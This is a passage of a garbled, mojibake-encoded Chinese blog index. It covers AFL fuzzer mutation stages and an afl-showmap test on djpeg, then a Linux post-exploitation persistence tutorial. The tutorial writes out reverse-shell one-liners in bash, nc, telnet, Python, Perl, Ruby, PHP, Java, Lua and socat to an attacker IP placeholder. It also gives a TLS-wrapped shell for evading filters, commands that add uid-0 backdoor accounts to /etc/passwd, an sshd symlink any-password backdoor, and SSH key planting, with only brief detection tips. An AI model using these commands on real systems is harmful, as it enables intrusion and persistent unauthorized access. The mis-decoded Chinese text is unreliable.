32/8ï¼Œæ¯æ¬¡å¯¹32ä¸ªbitè¿›è¡ŒåŠ å‡è¿ç®—ï¼ŒæŒ‰ç…§æ¯8ä¸ªbitçš„æ­¥é•¿ä»å¤´å¼€å§‹ï¼Œå³å¯¹æ–‡ä»¶çš„æ¯ä¸ªdwordè¿›è¡Œæ•´æ•°åŠ å‡å˜å¼‚ åŠ å‡å˜å¼‚çš„ä¸Šé™ï¼Œåœ¨config.hä¸­çš„å®ARITH_MAXå®šä¹‰ï¼Œé»˜è®¤ä¸º35ã€‚æ‰€ä»¥ï¼Œå¯¹ç›®æ ‡æ•´æ•°ä¼šè¿›è¡Œ+1, +2, â€¦, +35, -1, -2, â€¦, -35çš„å˜å¼‚ã€‚ç‰¹åˆ«åœ°ï¼Œç”±äºæ•´æ•°å­˜åœ¨å¤§ç«¯åºå’Œå°ç«¯åºä¸¤ç§è¡¨ç¤ºæ–¹å¼ï¼ŒAFLä¼šè´´å¿ƒåœ°å¯¹è¿™ä¸¤ç§æ•´æ•°è¡¨ç¤ºæ–¹å¼éƒ½è¿›è¡Œå˜å¼‚ã€‚ æ­¤å¤–ï¼ŒAFLè¿˜ä¼šæ™ºèƒ½åœ°è·³è¿‡æŸäº›arithmeticå˜å¼‚ã€‚ç¬¬ä¸€ç§æƒ…å†µå°±æ˜¯å‰é¢æåˆ°çš„effector mapï¼šå¦‚æœä¸€ä¸ªæ•´æ•°çš„æ‰€æœ‰byteséƒ½è¢«åˆ¤æ–­ä¸ºâ€œæ— æ•ˆâ€ï¼Œé‚£ä¹ˆå°±è·³è¿‡å¯¹æ•´æ•°çš„å˜å¼‚ã€‚ç¬¬äºŒç§æƒ…å†µæ˜¯ä¹‹å‰bitflipå·²ç»ç”Ÿæˆè¿‡çš„å˜å¼‚ï¼šå¦‚æœåŠ /å‡æŸä¸ªæ•°åï¼Œå…¶æ•ˆæœä¸ä¹‹å‰çš„æŸç§bitflipç›¸åŒï¼Œé‚£ä¹ˆè¿™æ¬¡å˜å¼‚è‚¯å®šåœ¨ä¸Šä¸€ä¸ªé˜¶æ®µå·²ç»æ‰§è¡Œè¿‡äº†ï¼Œæ­¤æ¬¡ä¾¿ä¸ä¼šå†æ‰§è¡Œã€‚ ###ï¼ˆ3ï¼‰ interest ä¸‹ä¸€ä¸ªé˜¶æ®µæ˜¯interestï¼Œå…·ä½“å¯åˆ†ä¸ºï¼š interest 8/8ï¼Œæ¯æ¬¡å¯¹8ä¸ªbitè¿›æ›¿æ¢ï¼ŒæŒ‰ç…§æ¯8ä¸ªbitçš„æ­¥é•¿ä»å¤´å¼€å§‹ï¼Œå³å¯¹æ–‡ä»¶çš„æ¯ä¸ªbyteè¿›è¡Œæ›¿æ¢ interest 16/8ï¼Œæ¯æ¬¡å¯¹16ä¸ªbitè¿›æ›¿æ¢ï¼ŒæŒ‰ç…§æ¯8ä¸ªbitçš„æ­¥é•¿ä»å¤´å¼€å§‹ï¼Œå³å¯¹æ–‡ä»¶çš„æ¯ä¸ªwordè¿›è¡Œæ›¿æ¢ interest 32/8ï¼Œæ¯æ¬¡å¯¹32ä¸ªbitè¿›æ›¿æ¢ï¼ŒæŒ‰ç…§æ¯8ä¸ªbitçš„æ­¥é•¿ä»å¤´å¼€å§‹ï¼Œå³å¯¹æ–‡ä»¶çš„æ¯ä¸ªdwordè¿›è¡Œæ›¿æ¢ è€Œç”¨äºæ›¿æ¢çš„â€interesting valuesâ€ï¼Œæ˜¯AFLé¢„è®¾çš„ä¸€äº›æ¯”è¾ƒç‰¹æ®Šçš„æ•°ï¼š static s8 interesting_8[] = { INTERESTING_8 }; static s16 interesting_16[] = { INTERESTING_8, INTERESTING_16 }; static s32 interesting_32[] = { INTERESTING_8, INTERESTING_16, INTERESTING_32 }; è¿™äº›æ•°çš„å®šä¹‰åœ¨config.hæ–‡ä»¶ä¸­ï¼š /* List of interesting values to use in fuzzing. */ #define INTERESTING_8 \\ -128, /* Overflow signed 8-bit when decremented */ \\ -1, /* */ \\ 0, /* */ \\ 1, /* */ \\ 16, /* One-off with common buffer size */ \\ 32, /* One-off with common buffer size */ \\ 64, /* One","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/:3:0","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/"},{"categories":["Fuzz"],"content":"æ•ˆæœåˆ†æ å‚è€ƒ https://lcamtuf.blogspot.com/2014/11/pulling-jpegs-out-of-thin-air.html ä¸­çš„æµ‹è¯•æ–¹æ³•ï¼ŒåŒæ ·ä»¥ djpeg ä¸ºç›®æ ‡ï¼Œæœ€åˆçš„æ ·æœ¬é›†åªæœ‰ä¸€ä¸ªæ–‡æœ¬ testï¼Œé‡‡ç”¨äºŒè¿›åˆ¶æ’æ¡©çš„æ–¹å¼è¿›è¡Œfuzzï¼Œ1ä¸ªä¸»èŠ‚ç‚¹ä»¥åŠ3ä¸ªä»èŠ‚ç‚¹åŒæ—¶è¿›è¡Œï¼Œæµ‹è¯•æœ€ç»ˆæ˜¯å¦èƒ½fuzzå‡ºä¸€ä¸ªåˆæ³•çš„å›¾ç‰‡æ–‡ä»¶ã€‚ fuzzåçš„æ ·æœ¬é›†åˆå¦‚ä¸‹ï¼š ä½¿ç”¨ afl-showmap å¯¹æ‰€æœ‰æ ·æœ¬è¿›è¡Œåˆ†æï¼Œç¼–å†™è„šæœ¬å¦‚ä¸‹ï¼š #!/bin/bash path=$1 dpath=$2 rm -rf $2/* for file in $(ls $1) do echo -e '\\n'$file afl-showmap -o $2/$file -Q -- /usr/bin/djpeg $1/$file echo -e '-------------------------------------\\n' done ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºæ ·æœ¬é›†åˆç›®å½•ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºè¾“å‡ºç›®å½•ï¼Œå‡è®¾è„šæœ¬åä¸º djpeg.sh ï¼Œæ ·æœ¬ç›®å½•ä¸º in ï¼Œè¾“å‡ºç›®å½•ä¸º map ./djpeg.sh in map è„šæœ¬çš„æ‰§è¡Œç»“æœå¯åœ¨ åˆ†æ/djpeg_shè„šæœ¬è¾“å‡ºç»“æœ.txt ä¸­æŸ¥çœ‹ï¼Œä»¥ä¸‹åªå±•ç¤ºéƒ¨åˆ†ï¼š id:000000,orig:1 afl-showmap 2.56b by \u003clcamtuf@google.com\u003e [*] Executing '/usr/bin/djpeg'... -- Program output begins -- Not a JPEG file: starts with 0x74 0x65 -- Program output ends -- [+] Captured 50 tuples in 'map/id:000000,orig:1'. ------------------------------------- id:000001,src:000000,op:havoc,rep:64,+cov afl-showmap 2.56b by \u003clcamtuf@google.com\u003e [*] Executing '/usr/bin/djpeg'... -- Program output begins -- Corrupt JPEG data: 2 extraneous bytes before marker 0xfe JPEG datastream contains no image -- Program output ends -- [+] Captured 68 tuples in 'map/id:000001,src:000000,op:havoc,rep:64,+cov'. ------------------------------------- id:000005,src:000000+000001,op:splice,rep:64 afl-showmap 2.56b by \u003clcamtuf@google.com\u003e [*] Executing '/usr/bin/djpeg'... -- Program output begins -- Corrupt JPEG data: 6 extraneous bytes before marker 0xfe JPEG datastream contains no image -- Program output ends -- [+] Captured 68 tuples in 'map/id:000005,src:000000+000001,op:splice,rep:64'. ------------------------------------- id:000021,src:000011,op:flip32,pos:2,+cov afl-showmap 2.56b by \u003clcamtuf@google.com\u003e [*] Executing '/usr/bin/djpeg'... -- Program output begins -- Premature end of JPEG file JPEG datastream contains no image -- Program output ends -- [+] Captured 59 tuples in 'map/id:000021,src:000011,op:flip32,pos:2,+cov'. ------------------------------------- id:000026,src:000021,op:havoc,rep:2 afl-showmap 2.56b by \u003clcamtuf@google.com\u003e [*] Executing '/usr/bin/djpeg'... -- Program output begins -- Premature end of JPEG file JPEG datastream contains no image -- Program output ends -- [+] Captured 60 tuples in 'map/id:000026,src:000021,op:havoc,rep:2'. ------------------------------------- å¯ä»¥çœ‹åˆ°ä¸Šé¢æ ·æœ¬idä¸º21å’Œ26çš„è¾“å‡ºç»“æœç›¸åŒï¼Œä½†æ˜¯æ‰§è¡Œè·¯å¾„ä¸åŒï¼Œå¯ä»¥ä½¿ç”¨ diff æŒ‡ä»¤è¿›è¡Œè·¯å¾„å¯¹æ¯”ï¼š diff -Nu map/id\\:000021\\,src\\:000011\\,op\\:flip32\\,pos\\:2\\,+cov map/id\\:000026\\,src\\:000021\\,op\\:havoc\\,rep\\:2 ç»“æœå¦‚ä¸‹ï¼š --- map/id:000021,src:000011,op:flip32,pos:2,+cov 2019-12-03 06:38:42.236000000 +0000 +++ map/id:000026,src:000021,op:havoc,rep:2 2019-12-03 06:38:42.388000000 +0000 @@ -1,20 +1,21 @@ 003224:1 004793:1 005209:1 -005993:1 +005993:2 006601:1 007073:1 008498:1 008874:1 -010130:1 +010130:2 010146:1 010282:1 -013459:1 +013459:2 +014971:1 017564:1 018892:1 019132:1 019148:1 -019172:1 +019172:2 019188:1 019236:1 019804:1 @@ -33,18 +34,18 @@ 032872:1 033112:1 037297:1 -037433:1 +037433:2 037817:1 039585:1 -039641:2 -043450:1 +039641:4 +043450:2 043562:1 044194:1 044818:1 045483:1 046955:1 047603:1 -048251:1 +048251:2 051300:1 052444:1 053124:1 ä»æœ€åˆçš„åªæœ‰æ–‡æœ¬å†…å®¹â€œtestâ€çš„æ ·æœ¬ï¼Œaflç¡®å®å·²ç»å‘ç°äº†å¾ˆå¤šå…¶å®ƒè·¯å¾„ï¼Œä½†æ˜¯åœ¨æˆ‘çš„æµ‹è¯•ç»“æœä¸­è¿˜æ˜¯æ²¡æœ‰fuzzå‡ºæ­£å¸¸çš„å›¾ç‰‡æ–‡ä»¶ï¼Œä»è¾“å‡ºç»“æœä¸Šçœ‹æ ·æœ¬idä¸º21å’Œ26ç®—æ˜¯æ¯”è¾ƒæ¥è¿‘ï¼Œæ²¡æœ‰æŠ¥æ˜æ˜¾é”™è¯¯ã€‚ Premature end of JPEG file JPEG datastream contains no image ","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/:3:1","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/"},{"categories":["Fuzz"],"content":"å‚è€ƒé“¾æ¥ https://github.com/google/AFL https://www.secpulse.com/archives/71903.html https://www.freebuf.com/articles/system/191536.html http://zeroyu.xyz/2019/05/15/how-to-use-afl-fuzz https://lcamtuf.blogspot.com/2014/11/pulling-jpegs-out-of-thin-air.html https://paper.seebug.org/841/ https://paper.seebug.org/496/#part-2afl https://rk700.github.io/2017/12/28/afl-internals/ https://rk700.github.io/2018/01/04/afl-mutations/ https://rk700.github.io/2018/02/02/afl-enhancement/ ","date":"2020-12-04","objectID":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/:3:2","tags":["Fuzz","AFL"],"title":"AFLäºŒä¸‰äº‹ -- 2","uri":"/2020/12/afl%E4%BA%8C%E4%B8%89%E4%BA%8B3/"},{"categories":["Misc"],"content":"Linux ä¸‹çš„æƒé™ç»´æŒ","date":"2020-12-04","objectID":"/2020/12/backdoor/","tags":["Linux"],"title":"Linux ä¸‹çš„æƒé™ç»´æŒ","uri":"/2020/12/backdoor/"},{"categories":["Misc"],"content":"æƒé™ç»´æŒ â€“ Linux ","date":"2020-12-04","objectID":"/2020/12/backdoor/:0:0","tags":["Linux"],"title":"Linux ä¸‹çš„æƒé™ç»´æŒ","uri":"/2020/12/backdoor/"},{"categories":["Misc"],"content":"ä¸€ã€Basic Knowledge ","date":"2020-12-04","objectID":"/2020/12/backdoor/:1:0","tags":["Linux"],"title":"Linux ä¸‹çš„æƒé™ç»´æŒ","uri":"/2020/12/backdoor/"},{"categories":["Misc"],"content":"1. æ¦‚å¿µ å¯ä»¥ç®€å•ç†è§£ä¸ºé€šè¿‡éšè—æ‰‹æ®µæˆ–åœ¨ç›®æ ‡ä¸Šå®‰è£…åé—¨ä»¥ä¿æŒå·²è·å–çš„æƒé™ä¸ä¼šè¢«æ‰“æ‰ï¼Œä¸€ç›´æ§åˆ¶ç›®æ ‡ï¼Œå±äºåæ¸—é€é˜¶æ®µçš„é‡ç‚¹å†…å®¹ã€‚ ","date":"2020-12-04","objectID":"/2020/12/backdoor/:1:1","tags":["Linux"],"title":"Linux ä¸‹çš„æƒé™ç»´æŒ","uri":"/2020/12/backdoor/"},{"categories":["Misc"],"content":"2. å‰ç½®æ¡ä»¶ â€“ è·å–åˆå§‹æƒé™ è·å–åˆå§‹æƒé™ã€‚æœ€å¸¸è§ä¹Ÿæ˜¯ä¸ªäººæœ€å–œæ¬¢çš„æ˜¯åå¼¹shellå›æ¥ï¼Œæ–¹ä¾¿åç»­æ“ä½œã€‚è¿™é‡Œç®€å•æ€»ç»“ä¸‹åå¼¹shellçš„å¸¸è§æ‰‹æ³•ï¼š 1. Bashåå¼¹ æ”»å‡»æœºç›‘å¬ï¼š nc -lvvp port ç›®æ ‡æ‰§è¡Œï¼š bash -i \u003e\u0026 /dev/tcp/x.x.x.x/port 0\u003e\u00261 æˆ–è€… bash -i 5\u003c\u003e/dev/tcp/host/port 0\u003e\u00265 1\u003e\u00265 bash -iï¼šæ‰“å¼€ä¸€ä¸ªäº¤äº’çš„bash \u003e\u0026 /dev/tcp/x.x.x.x/portï¼šè°ƒç”¨socketå»ºç«‹é“¾æ¥ï¼Œx.x.x.xä¸ºè¦æ¥æ”¶shellçš„ä¸»æœºipï¼Œportä¸ºç«¯å£ï¼Œå°†æ ‡å‡†é”™è¯¯å’Œæ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°socketè¿æ¥æ–‡ä»¶ã€‚ 0\u003e\u00261ï¼šæ ‡å‡†è¾“å…¥é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºï¼Œæ­¤æ—¶æ ‡å‡†è¾“å‡ºæŒ‡å‘socketè¿æ¥ï¼Œä»è€Œå®ç°äº†ä¸åå¼¹shellçš„äº¤äº’ã€‚ ç¬¬äºŒç§åˆ™æ˜¯å°†æ ‡å‡†è¾“å…¥ã€è¾“å‡ºå’Œé”™è¯¯å‡é‡å®šå‘åˆ°socketè¿æ¥æ–‡ä»¶ã€‚ å¤‡æ³¨ï¼šLinuxä¸åŒå‘è¡Œç‰ˆä¹‹é—´å­˜åœ¨å·®å¼‚ï¼ŒæŸäº›å‘½ä»¤å¯èƒ½å¹¶ä¸é€‚ç”¨ï¼Œå¯è‡ªè¡Œè°ƒæ•´ã€‚ 2. telnetåå¼¹ ç¬¬ä¸€ç§ï¼š æ”»å‡»æœºå¼€2ä¸ªç»ˆç«¯ï¼Œåˆ†åˆ«æ‰§è¡Œç›‘å¬ï¼š nc -lv port1 å’Œ nv -lv port2 ç›®æ ‡ä¸»æœºæ‰§è¡Œï¼š telent x.x.x.x port1 | /bin/bash | telnet x.x.x.x port2 ç›‘å¬2ä¸ªç«¯å£åˆ†åˆ«ç”¨æ¥è¾“å…¥å’Œè¾“å‡ºï¼Œå…¶ä¸­x.x.x.xå‡ä¸ºæ”»å‡»è€…ipã€‚ ç¬¬äºŒç§ï¼š æ”»å‡»æœºç›‘å¬ï¼š nc -lv port ç›®æ ‡ä¸»æœºæ‰§è¡Œï¼š rm -f /tmp/a;mknod /tmp/a p;telnet x.x.x.x port 0\u003c/tmp/a | /bin/bash 1\u003etmp/a å…¶ä¸­x.x.x.xä¸ºæ”»å‡»æœºipã€‚ 3. nc(netcat)åå¼¹ æ”»å‡»æœºç›‘å¬ï¼š nc -lv port ç›®æ ‡æ‰§è¡Œï¼š nc -e /bin/bash x.x.x.x port å¦‚æœç›®æ ‡ä¸Šæ²¡æœ‰-eå‚æ•°å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2\u003e$1 | nc x.x.x.x port \u003e/tmp/f mkfifoçš„ä½œç”¨æ˜¯åˆ›å»ºFIFOç‰¹æ®Šæ–‡ä»¶ï¼Œä¹Ÿç§°ä¸ºå‘½åç®¡é“ã€‚FIFOæ–‡ä»¶åœ¨ç£ç›˜ä¸Šæ²¡æœ‰æ•°æ®å—ï¼Œä»…ç”¨æ¥æ ‡è¯†å†…æ ¸ä¸­çš„ä¸€æ¡é€šé“ï¼Œå„è¿›ç¨‹å¯ä»¥æ‰“å¼€FIFOæ–‡ä»¶è¿›è¡Œè¯»å†™æ“ä½œï¼Œæœ¬è´¨ä¸Šå°±æ˜¯åœ¨è¯»å†™å†…æ ¸é€šé“ï¼Œè¿™æ ·å°±å¯ä»¥å®ç°è¿›ç¨‹é—´é€šä¿¡ã€‚ æ­¤å¤–ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨telnetçš„ç›‘å¬2ä¸ªç«¯å£çš„æ–¹å¼ï¼š nc x.x.x.x port1 | /bin/bash | nc x.x.x.x port2 4. å¸¸è§è„šæœ¬åå¼¹ ä¸‹è¿°è„šæœ¬å‡éœ€è¦ç°åœ¨æ”»å‡»æœºä¸Šå¼€å¯ç›‘å¬ï¼šnc -lv portï¼Œå°†è„šæœ¬ä¸­ipæ›¿æ¢ä¸ºå¯¹åº”çš„æ”»å‡»æœºIPï¼Œportæ›¿æ¢ä¸ºå®é™…ä½¿ç”¨çš„ç«¯å£ã€‚ 1. Python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"x.x.x.x\",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);' 2. Perl ç¬¬ä¸€ç§ï¼š perl -e 'use Socket;$i=\"x.x.x.x\";$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"\u003e\u0026S\");open(STDOUT,\"\u003e\u0026S\");open(STDERR,\"\u003e\u0026S\");exec(\"/bin/sh -i\");};' ç¬¬äºŒç§ï¼š perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"x.x.x.x:port\");STDIN-\u003efdopen($c,r);$~-\u003efdopen($c,w);system$_ while\u003c\u003e;' 3. Ruby ç¬¬ä¸€ç§ï¼š ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"x.x.x.x\",\"port\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end' ç¬¬äºŒç§ï¼š ruby -rsocket -e'f=TCPSocket.open(\"x.x.x.x\",port).to_i;exec sprintf(\"/bin/sh -i \u003c\u0026%d \u003e\u0026%d 2\u003e\u0026%d\",f,f,f)' 4. PHP php -r '$sock=fsockopen(\"x.x.x.x\",port);exec(\"/bin/bash -i \u003c\u00263 \u003e\u00263 2\u003e\u00263\");' 5. Java public class Revs { /** * @param args * @throws Exception */ public static void main(String[] args) throws Exception { // TODO Auto-generated method stub Runtime r = Runtime.getRuntime(); String cmd[]= {\"/bin/bash\",\"-c\",\"exec 5\u003c\u003e/dev/tcp/x.x.x.x/port;cat \u003c\u00265 | while read line; do $line 2\u003e\u00265 \u003e\u00265; done\"}; Process p = r.exec(cmd); p.waitFor(); } } 6. Lua lua -e \"require('socket');require('os');t=socket.tcp();t:connect('x.x.x.x','port');os.execute('/bin/sh -i \u003c\u00263 \u003e\u00263 2\u003e\u00263');\" 3. å…¶ä»–æ–¹æ³• 1. socat æ”»å‡»æœºç›‘å¬ï¼š socat file:`tty`,raw,echo=0 tcp-listen:port ä¸Šä¼ socatåˆ°ç›®æ ‡ä¸»æœºï¼Œç„¶åæ‰§è¡Œï¼š socat exec:'bash -li',pty,stderr,setid,sigint,sane tcp x.x.x.x:port 2. åªæœ‰80å’Œ443ç«¯å£ä¸”åå¼¹shellæµé‡è¢«æ‹¦æˆª æ–¹æ³•è®ºï¼šåŠ å¯†æµç¨‹ï¼Œç»•è¿‡æ‹¦æˆª Step 1ï¼šVPSä¸Šç”ŸæˆSSLè¯ä¹¦çš„å…¬é’¥/ç§é’¥å¯¹ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes Step 2ï¼šVPNç›‘å¬åå¼¹shell openssl s_server -quiet -key key.pem -cert cert.pem -port 443 Step 3ï¼šè¿æ¥ mkfifo /tmp/v4ler1an;/bin/bash -i \u003c /tmp/v4ler1an 2\u003e\u00261 |openssl s_client -quiet -connect x.x.x.x:443 \u003e /tmp/v4ler1an æ­¤æ—¶çš„shellå­˜åœ¨ç¼ºé™·ï¼ˆæ— æ³•å‘½ä»¤è¡¥å…¨ç­‰ï¼‰ï¼Œé€šè¿‡ä»¥ä¸‹æ–¹æ³•ä¿®å¤ï¼š python -c 'import pty; pty.spawn(\"/bin/bash\")' ptyæ˜¯ä¸€ä¸ªä¼ªç»ˆç«¯æ¨¡å—ã€‚pty.spawn(argv[, master_read[, stdin_read]])äº§ç”Ÿä¸€ä¸ªè¿›ç¨‹ï¼Œå¹¶å°†å…¶æ§åˆ¶ç»ˆç«¯ä¸å½“å‰è¿›ç¨‹çš„æ ‡å‡†è¾“å…¥è¾“å‡ºè¿æ¥ã€‚è¿™é€šå¸¸ç”¨äºé˜»æŒ¡åšæŒä»æ§åˆ¶ç»ˆç«¯è¯»å–çš„ç¨‹åºã€‚å‘å‡½æ•° master_read å’Œ stdin_read ä¼ é€’äº†æ–‡ä»¶æè¿°ç¬¦ï¼Œå®ƒä»¬åº”ä»ä¸­è¯»å–ï¼Œå¹¶ä¸”å®ƒä»¬åº”å§‹ç»ˆè¿”å›å­—èŠ‚å­—ç¬¦ä¸²ã€‚ä¸¤ä¸ªå‡½æ•°çš„é»˜è®¤å®ç°åœ¨æ¯æ¬¡å‡½æ•°è¢«è°ƒç”¨æ—¶å°†è¯»å–å¹¶è¿”å›è‡³å¤š 1024 ä¸ªå­—èŠ‚ã€‚ ä¼šå‘ master_read å›è°ƒä¼ å…¥ä¼ªç»ˆç«¯çš„ä¸»æ–‡ä»¶æè¿°ç¬¦ä»¥ä»å­è¿›ç¨‹è¯»å–è¾“å‡ºï¼Œè€Œå‘ stdin_read ä¼ å…¥æ–‡ä»¶æè¿°ç¬¦ 0 ä»¥ä»çˆ¶è¿›ç¨‹çš„æ ‡å‡†è¾“å…¥è¯»å–æ•°æ®ã€‚ åœ¨ 3.4 ç‰ˆæ›´æ”¹: spawn() ç°åœ¨ä»å­è¿›ç¨‹çš„ os.waitpid() è¿”å›çŠ¶æ€å€¼ ","date":"2020-12-04","objectID":"/2020/12/backdoor/:1:2","tags":["Linux"],"title":"Linux ä¸‹çš„æƒé™ç»´æŒ","uri":"/2020/12/backdoor/"},{"categories":["Misc"],"content":"äºŒã€æƒé™ç»´æŒæ–¹æ³• ","date":"2020-12-04","objectID":"/2020/12/backdoor/:2:0","tags":["Linux"],"title":"Linux ä¸‹çš„æƒé™ç»´æŒ","uri":"/2020/12/backdoor/"},{"categories":["Misc"],"content":"1. ä¸€å¥è¯æ·»åŠ ç”¨æˆ·å’Œå¯†ç  æ·»åŠ æ™®é€šç”¨æˆ·ï¼š # åˆ›å»ºä¸€ä¸ªç”¨æˆ·åguestï¼Œå¯†ç ä¸º123456çš„æ™®é€šç”¨æˆ· useradd -p `openssl passwd -1 -salt 'salt' 123456` guest # useradd -p æ–¹æ³• `` æ˜¯ç”¨æ¥å­˜æ”¾å¯æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤ã€‚â€œ$()â€ä¹Ÿå¯ä»¥å­˜æ”¾å‘½ä»¤æ‰§è¡Œè¯­å¥ã€‚ useradd -p \"$(openssl passwd -1 123456)\" guest # chpasswdæ–¹æ³• useradd guest;echo 'guest:123456'|chpasswd # echo -eæ–¹æ³• useradd guest;echo -e \"123456\\n123456\\n\" |passwd guest æ·»åŠ rootç”¨æˆ·ï¼š # åˆ›å»ºä¸€ä¸ªç”¨æˆ·åä¸ºguestï¼Œå¯†ç ä¸º123456çš„rootç”¨æˆ· useradd -p `openssl passwd -1 -salt 'salt' 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/guest æ’æŸ¥æ–¹æ³•ï¼š # æŸ¥è¯¢ç‰¹æƒç”¨æˆ·ï¼ˆuid = 0ï¼‰ awk -F: '$3==0{print $1}' /etec/passwd # æŸ¥è¯¢å¯ä»¥è¿œç¨‹ç™»å½•çš„å¸å·ä¿¡æ¯ awk '/\\$1|\\$6/{print $1}' /etc/shadow # é™¤rootå¸å·å¤–ï¼Œå…¶ä»–å¸å·æ˜¯å¦å­˜åœ¨sudoæƒé™ã€‚å¦‚éç®¡ç†éœ€è¦ï¼Œæ™®é€šå¸å·åº”åˆ é™¤sudoæƒé™ more /etc/sudoers | grep -v \"^#\\|^$\" | grep \"ALL=(ALL)\" ","date":"2020-12-04","objectID":"/2020/12/backdoor/:2:1","tags":["Linux"],"title":"Linux ä¸‹çš„æƒé™ç»´æŒ","uri":"/2020/12/backdoor/"},{"categories":["Misc"],"content":"2. å¢åŠ è¶…çº§ç”¨æˆ· åœ¨å®Œæˆç”¨æˆ·æ·»åŠ åï¼Œå¯ä»¥å¯¹æ·»åŠ çš„ç”¨æˆ·èµ‹äºˆè¶…çº§ç”¨æˆ·æƒé™ã€‚ ç›®æ ‡ä¸»æœºæ‰§è¡Œï¼š echo \"v4ler1anâŒ0:0::/:/bin/sh\" \u003e\u003e /etc/passwd å¦‚æœç›®æ ‡ç³»ç»Ÿä¸å…è®¸uid=0çš„ç”¨æˆ·è¿œç¨‹ç™»å½•ï¼Œå¯ä»¥å¢åŠ ä¸€ä¸ªæ™®é€šç”¨æˆ·è´¦å·ï¼š echo \"v4ler1an:ğŸ‘-1ğŸ‘-1ğŸ‘-1:500\" \u003e\u003e /etc/shadow æœ‰äº›æƒ…å†µä¸‹æ·»åŠ ä¸æˆåŠŸå¯èƒ½æ˜¯å› ä¸ºå¯†ç å¼ºåº¦ä¸å¤Ÿï¼Œå¯ä»¥é€‚å½“å¢åŠ å¯†ç å¼ºåº¦ã€‚ ","date":"2020-12-04","objectID":"/2020/12/backdoor/:2:2","tags":["Linux"],"title":"Linux ä¸‹çš„æƒé™ç»´æŒ","uri":"/2020/12/backdoor/"},{"categories":["Misc"],"content":"1. SSHåé—¨ 1. sshd è½¯è¿æ¥ ç›®æ ‡ä¸»æœºå»ºç«‹è½¯è¿æ¥ï¼š ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=5555; æ”»å‡»æœºç›´æ¥sshç™»å½• ssh root@x.x.x.x -p 5555 è¿™é‡Œç«¯å£å¯ä»¥ä»»æ„ï¼Œä½†æ˜¯/tmp/suéƒ¨åˆ†æœ‰é™åˆ¶ã€‚å¯ä»¥ä½¿ç”¨ä»»æ„å¯†ç è¿›è¡Œç™»å½•ï¼Œåœ¨sshdæœåŠ¡é…ç½®è¿è¡ŒPAMè®¤è¯çš„å‰æä¸‹ï¼ŒPAMé…ç½®æ–‡ä»¶ä¸­æ§åˆ¶æ ‡å¿—ä¸ºsufficientæ—¶åªè¦pam_rootokæ¨¡å—æ£€æµ‹uidä¸º0å³rootæƒé™å³å¯æˆåŠŸè®¤è¯ç™»é™†ã€‚é€šè¿‡è½¯è¿æ¥çš„æ–¹å¼ï¼Œå®è´¨ä¸ŠPAMè®¤è¯æ˜¯é€šè¿‡è½¯è¿æ¥çš„æ–‡ä»¶å /tmp/su åœ¨/etc/pam.d/ç›®å½•ä¸‹å¯»æ‰¾å¯¹åº”çš„PAMé…ç½®æ–‡ä»¶(å¦‚: /etc/pam.d/su)ï¼Œä»»æ„å¯†ç ç™»é™†çš„æ ¸å¿ƒæ˜¯auth sufficient pam_rootok.soï¼Œæ‰€ä»¥åªè¦PAMé…ç½®æ–‡ä»¶ä¸­åŒ…å«æ­¤é…ç½®å³å¯SSHä»»æ„å¯†ç ç™»é™†ï¼Œé™¤äº†suä¸­ä¹‹å¤–è¿˜æœ‰chshã€chfnåŒæ ·å¯ä»¥ã€‚å…·ä½“åŸç†è¯¦è§Linuxçš„ä¸€ä¸ªåé—¨å¼•å‘å¯¹PAMçš„æ¢ç©¶ã€‚ ç¼ºç‚¹ï¼šæ˜“è¢«æ’æŸ¥ï¼Œé€šè¿‡è¿›ç¨‹ã€ç«¯å£å¯ä»¥è½»æ¾çœ‹åˆ°å¼‚å¸¸ï¼Œä½¿ç”¨kill -s 9 PIDå³å¯æ¸…é™¤åé—¨ã€‚ 2. sshå…å¯†åé—¨(æ–‡ä»¶è½åœ°) åœ¨æ”»å‡»æœºä¸Šç”Ÿæˆä¸€å¯¹å…¬ç§é’¥ï¼Œç„¶åå°†å…¬é’¥ä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºï¼Œè·¯å¾„ä¸º~/.ssh/authorized_keysï¼Œæ”»å‡»æœºæœ¬åœ°ä¿å­˜ç§é’¥ã€‚é€šè¿‡sshç™»å½•ï¼Œsshç¨‹åºä¼šå‘é€ç§é’¥åˆ°ç›®æ ‡ä¸»æœºä¸å…¬é’¥è¿›è¡ŒåŒ¹é…ï¼ŒåŒ¹é…é€šè¿‡å³å¯å®ç°sshç™»å½•ã€‚ ç”Ÿæˆå…¬é’¥å’Œç§é’¥ï¼š ssh-keygen -t rsa è¿›å…¥/root/.sshï¼Œå°†å…¬é’¥id_rsa.pubçš„å†…å®¹å¤åˆ¶åˆ°ç›®æ ‡ä¸»æœºï¼ˆæ˜¯å¦ä¸Šä¼ 